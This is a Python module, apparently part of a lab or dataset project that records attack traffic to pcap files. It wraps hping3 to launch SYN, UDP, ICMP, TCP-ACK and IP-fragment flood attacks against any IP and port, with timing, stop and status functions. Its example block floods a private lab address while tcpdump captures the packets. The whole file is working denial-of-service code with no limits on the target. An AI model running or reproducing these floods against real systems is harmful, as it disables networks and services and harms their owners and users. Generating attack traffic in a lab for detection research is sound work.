"""
Attack Engine Module

This module provides functionality for:
- SYN flood attacks
- UDP flood attacks  
- ICMP flood attacks
- Attack execution and monitoring
"""

import asyncio
import logging
import subprocess
from typing import Optional, Dict, Any

# Configure logger
logger = logging.getLogger(__name__)

class AttackEngine:
    """Attack engine for executing various network attacks"""
    
    def __init__(self):
        self.attack_process: Optional[asyncio.subprocess.Process] = None
        self.current_attack: Optional[str] = None
        self.attack_config: Optional[Dict[str, Any]] = None
    
    async def start_attack(self, attack_type: str, target_ip: str, interface: str = "eth0", 
                          duration: int = 60, port: int = 55443) -> bool:
        """
        Start an attack with specified parameters.
        
        Args:
            attack_type: Type of attack (syn_flood, udp_flood, icmp_flood, etc.)
            target_ip: Target IP address
            interface: Network interface to use
            duration: Attack duration in seconds
            port: Target port for the attack (default: 55443)
            
        Returns:
            bool: True if attack started successfully, False otherwise
        """
        logger.info(f"Starting {attack_type} attack on {target_ip}:{port} for {duration} seconds")
        
        try:
            command = self._build_attack_command(attack_type, target_ip, interface, port)
            
            if not command:
                logger.error(f"Unknown attack type: {attack_type}")
                return False
            
            # Add timeout to the command if it's a continuous attack
            if attack_type in ['syn_flood', 'udp_flood', 'icmp_flood', 'tcp_flood', 'ip_frag_flood']:
                command = ['timeout', str(duration)] + command
            
            # Create subprocess to execute the attack command
            self.attack_process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            
            if self.attack_process and self.attack_process.pid:
                self.current_attack = attack_type
                self.attack_config = {
                    'type': attack_type,
                    'target': target_ip,
                    'interface': interface,
                    'duration': duration,
                    'port': port
                }
                logger.info(f"Attack started successfully (PID: {self.attack_process.pid})")
                
                # Wait for the process to finish (blocks for duration seconds)
                await self.attack_process.wait()
                logger.info("Attack process finished")
                return True
            else:
                logger.error("Failed to start attack process")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start attack: {e}")
            return False
    
    def _build_attack_command(self, attack_type: str, target_ip: str, interface: str, port: int) -> Optional[list]:
        """Build the command list for the specified attack type"""
        
        attack_commands = {
            'syn_flood': [
                'hping3', '-S', '-I', interface, 
                '-p', str(port), '-i', 'u1000', '--flood', target_ip
            ],
            'udp_flood': [
                'hping3', '--udp', '-I', interface,
                '-p', str(port), '-i', 'u1000', '--flood', target_ip
            ],
            'icmp_flood': [
                'hping3', '--icmp', '--flood', target_ip
            ],
            'tcp_flood': [
                'hping3', '-A', '-I', interface,
                '-p', str(port), '-i', 'u1000', '--flood', target_ip
            ],
            'ip_frag_flood': [
                'hping3', '-f', '-I', interface,
                '-p', str(port), '--flood', target_ip
            ]
        }
        
        return attack_commands.get(attack_type)
    
    async def stop_attack(self) -> bool:
        """
        Stop the currently running attack.
        
        Returns:
            bool: True if attack stopped successfully, False otherwise
        """
        if not self.attack_process:
            logger.warning("No attack process to stop")
            return False
        
        try:
            # Terminate the attack process
            self.attack_process.terminate()
            
            # Wait for process to terminate with timeout
            try:
                await asyncio.wait_for(self.attack_process.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                logger.warning("Process didn't terminate gracefully, forcing kill")
                self.attack_process.kill()
                await self.attack_process.wait()
            
            logger.info("Attack stopped successfully")
            self.attack_process = None
            self.current_attack = None
            self.attack_config = None
            return True
            
        except Exception as e:
            logger.error(f"Failed to stop attack: {e}")
            # Force cleanup
            if self.attack_process:
                try:
                    self.attack_process.kill()
                except:
                    pass
                self.attack_process = None
            self.current_attack = None
            self.attack_config = None
            return False
    
    def get_attack_status(self) -> Dict[str, Any]:
        """
        Get the current attack status.
        
        Returns:
            Dict containing attack status information
        """
        status = {
            'is_running': self.attack_process is not None,
            'attack_type': self.current_attack,
            'config': self.attack_config
        }
        
        if self.attack_process:
            status['pid'] = self.attack_process.pid
            status['returncode'] = self.attack_process.returncode
        
        return status
    
    def is_attack_running(self) -> bool:
        """Check if an attack is currently running"""
        return self.attack_process is not None and self.attack_process.returncode is None

    async def _monitor_attack(self, duration: int):
        """Monitor attack process and cleanup after duration"""
        try:
            # Wait for the specified duration
            await asyncio.sleep(duration)
            
            # Check if process is still running
            if self.attack_process and self.attack_process.returncode is None:
                logger.info(f"Attack duration ({duration}s) completed, stopping attack")
                await self.stop_attack()
            else:
                logger.info("Attack completed naturally")
                
        except Exception as e:
            logger.error(f"Error in attack monitoring: {e}")
            # Ensure cleanup
            if self.attack_process:
                try:
                    self.attack_process.kill()
                except:
                    pass
                self.attack_process = None
            self.current_attack = None
            self.attack_config = None


if __name__ == '__main__':
    # Example usage with traffic capture
    async def test_attack_engine():
        from traffic_capture import TcpdumpUtil
        
        engine = AttackEngine()
        
        # Capture on multiple interfaces to ensure bidirectional traffic
        # Use 'any' interface to capture all traffic, or specify multiple interfaces
        tcpdump = TcpdumpUtil(
            output_file='../data/attack_capture.pcap', 
            interface='any',  # Capture on all interfaces
            extra_args=['-s', '0']  # Capture full packet size
        )
        
        try:
            # Start traffic capture
            print("Starting traffic capture on all interfaces...")
            tcpdump.start()
            
            # Start attack (will auto-stop after 5 seconds)
            print("Starting attack (will run for 5 seconds)...")
            success = await engine.start_attack('syn_flood', '10.12.0.178', 'eth0', 5, 80)
            print(f"Attack started: {success}")
            
            # Check status
            status = engine.get_attack_status()
            print(f"Attack status: {status}")
            
            # Wait for attack to complete automatically
            print("Waiting for attack to complete...")
            while engine.is_attack_running():
                await asyncio.sleep(1)
                print(".", end="", flush=True)
            print("\n✅ Attack completed automatically!")
            
            # Stop traffic capture
            print("Stopping traffic capture...")
            tcpdump.stop()
            
            print("✅ Test completed! Check ../data/attack_capture.pcap for captured traffic")
            print("📊 Captured traffic includes:")
            print("   - Attack packets (eth0 → target)")
            print("   - Response packets (target → eth0)")
            print("   - Related network traffic")
            print("   - All interfaces: eth0, wlan0, docker networks, etc.")
            
        except Exception as e:
            print(f"❌ Test failed: {e}")
            # Ensure cleanup
            if engine.is_attack_running():
                try:
                    await asyncio.wait_for(engine.stop_attack(), timeout=5.0)
                except:
                    if engine.attack_process:
                        try:
                            engine.attack_process.kill()
                        except:
                            pass
            try:
                tcpdump.stop()
            except:
                pass
    
    # Run test
    asyncio.run(test_attack_engine())
 